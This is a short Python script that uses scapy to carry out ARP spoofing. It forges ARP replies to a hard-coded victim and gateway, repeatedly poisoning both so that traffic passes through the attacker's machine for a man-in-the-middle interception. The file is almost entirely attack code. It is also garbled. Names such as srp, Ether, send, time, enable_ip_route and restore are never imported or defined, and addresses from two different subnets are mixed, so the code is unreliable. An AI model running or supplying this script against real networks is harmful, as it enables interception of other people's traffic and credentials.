import scapy.all as scapy

def get_mac(ip):
   
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

packet=scapy.ARP(op=2,pdst="192.168.43.132",hwdst="cc:2f:71:12:da:a9",psrc="192.168.43.1")


def spoof(target_ip, host_ip, verbose=True):
   
    target_mac = get_mac(target_ip)
   
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

print(packet.summary())
print(packet.show())

print("packet is going ----")

for i in range(32):
	scapy.send(packet)

if __name__ == "__main__":
    target = "192.168.1.100"
    host = "192.168.1.1"
    verbose = True
    enable_ip_route()
    try:
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target, host)
        restore(host, target)